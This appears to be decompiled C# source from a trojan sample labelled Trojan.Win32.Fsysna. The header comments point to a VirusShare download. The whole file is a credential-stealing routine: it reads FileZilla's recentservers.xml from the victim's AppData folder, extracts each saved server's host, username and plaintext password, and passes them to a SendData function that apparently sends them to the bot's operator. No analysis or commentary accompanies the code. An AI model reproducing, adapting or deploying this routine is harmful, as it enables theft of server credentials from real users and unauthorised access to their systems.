// Decompiled with JetBrains decompiler
// Type: Stub.c_Passwords
// Assembly: Bot, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 85CBEE6D-9173-48CF-9DE2-C5D6EFA84893
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Fsysna.dosu-c8b1b84f43bfbe7a69a68cc22f61d7b748661a1fe24c157f43f282f251b83c42.exe

using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace Stub
{
  internal class c_Passwords
  {
    public static void SendFileZilla()
    {
      string empty1 = string.Empty;
      string input = string.Empty;
      string empty2 = string.Empty;
      string empty3 = string.Empty;
      string empty4 = string.Empty;
      string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\recentservers.xml";
      if (!File.Exists(path))
        return;
      using (StreamReader streamReader = new StreamReader(path, Encoding.Default))
        input = streamReader.ReadToEnd();
      string[] strArray = Regex.Split(input, "<Server>");
      for (int index = 0; index < strArray.Length; ++index)
      {
        if (strArray[index].IndexOf("<Host>") != -1)
          c_Main.SendData("Passwords|FileZilla|" + Regex.Split(Regex.Split(strArray[index], "<Host>")[1], "</Host>")[0] + "|" + Regex.Split(Regex.Split(strArray[index], "<User>")[1], "</User>")[0] + "|" + Regex.Split(Regex.Split(strArray[index], "<Pass>")[1], "</Pass>")[0] + "|");
      }
    }
  }
}
